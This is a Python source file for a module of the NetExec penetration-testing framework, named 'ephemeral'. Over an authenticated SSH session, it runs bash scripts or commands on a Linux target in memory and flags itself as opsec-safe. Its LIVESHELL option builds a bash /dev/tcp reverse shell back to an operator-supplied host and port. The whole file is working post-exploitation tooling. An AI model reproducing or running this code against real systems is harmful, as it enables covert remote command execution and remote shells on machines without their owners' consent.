# ~/.nxc/modules/ephemeral.py
import threading
import time
import os
from nxc.modules.module_base import CATEGORY  # Import CATEGORY for module metadata


class NXCModule:
    name = "ephemeral"
    description = "Run bash scripts entirely in memory on a Linux target"
    supported_protocols = ["ssh"]
    opsec_safe = True
    multiple_hosts = False
    category = CATEGORY.ENUMERATION

    def __init__(self):
        self.conn = None
        self.transport = None
        self.script_path = None
        self.raw_command = None
        self.thread = None
        self.liveshell = False
        self.timeout = 60
        self.killfile = None
        self.lhost = None
        self.lport = None

    def options(self, context, module_options):
        self.script_path = module_options.get("SCRIPT")
        self.raw_command = module_options.get("COMMAND")
        self.liveshell = module_options.get("LIVESHELL", False)
        self.timeout = int(module_options.get("TIMEOUT", 60))
        self.killfile = module_options.get("KILLFILE")
        self.lhost = module_options.get("LHOST")
        self.lport = int(module_options.get("LPORT")) if module_options.get("LPORT") else None

        if self.liveshell and not self.timeout:
            self.timeout = 60  # default timeout

        context.log.display(
            f"[ephemeral] LIVESHELL={self.liveshell}, TIMEOUT={self.timeout}, "
            f"LHOST={self.lhost}, LPORT={self.lport}, KILLFILE={self.killfile}"
        )

    def on_login(self, context, connection):
        if not hasattr(connection, "conn") or connection.conn is None:
            context.log.error("[ephemeral] SSH client not found on connection.")
            return

        self.conn = connection.conn
        self.transport = self.conn.get_transport()
        if self.transport is None or not self.transport.is_active():
            context.log.error("[ephemeral] SSH transport not active.")
            return

        context.log.display("[ephemeral] SSH login succeeded!")

        # Determine script or command to run
        if self.script_path:
            with open(self.script_path) as f:
                script_content = f.read()
        elif self.raw_command:
            script_content = self.raw_command
        elif getattr(connection.args, "execute", None):
            # fallback to NetExec -x command
            script_content = connection.args.execute
        elif self.liveshell:
            # If liveshell, run reverse shell inline
            script_content = self._generate_reverse_shell()
        else:
            context.log.error("[ephemeral] No commands to execute.")
            return

        # Run command in a separate thread
        self.thread = threading.Thread(target=self._run_command, args=(context, script_content), daemon=True)
        self.thread.start()

        # Keep alive until execution completes
        while self.thread.is_alive():
            # Kill-switch check
            if self.killfile and os.path.exists(self.killfile):
                context.log.display(f"[ephemeral] Killfile {self.killfile} detected, terminating shell.")
                break
            time.sleep(0.1)

    def _generate_reverse_shell(self):
        return (
            f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
            if self.lhost and self.lport
            else ""
        )

    def _run_command(self, context, script_content):
        try:
            chan = self.transport.open_session()
            chan.exec_command("stdbuf -oL -eL bash -s")
            chan.sendall(script_content.encode() + b"\n")
            chan.shutdown_write()

            # Stream stdout/stderr live
            while not chan.exit_status_ready():
                if chan.recv_ready():
                    out = chan.recv(4096)
                    if out:
                        context.log.display(out.decode(errors="ignore").rstrip())
                if chan.recv_stderr_ready():
                    err = chan.recv_stderr(4096)
                    if err:
                        context.log.display(f"[ERR] {err.decode(errors='ignore').rstrip()}")
                time.sleep(0.01)

            # Drain remaining output
            while chan.recv_ready():
                out = chan.recv(4096)
                if out:
                    context.log.display(out.decode(errors="ignore").rstrip())
            while chan.recv_stderr_ready():
                err = chan.recv_stderr(4096)
                if err:
                    context.log.display(f"[ERR] {err.decode(errors='ignore').rstrip()}")

            exit_code = chan.recv_exit_status()
            context.log.display(f"[ephemeral] Finished with exit code: {exit_code}")
            chan.close()
            self.conn.close()
            context.log.display("[ephemeral] SSH connection closed.")

        except Exception as e:
            context.log.error(f"[ephemeral] Execution error: {e}")
            if self.conn:
                self.conn.close()
                context.log.display("[ephemeral] SSH connection closed due to error.")
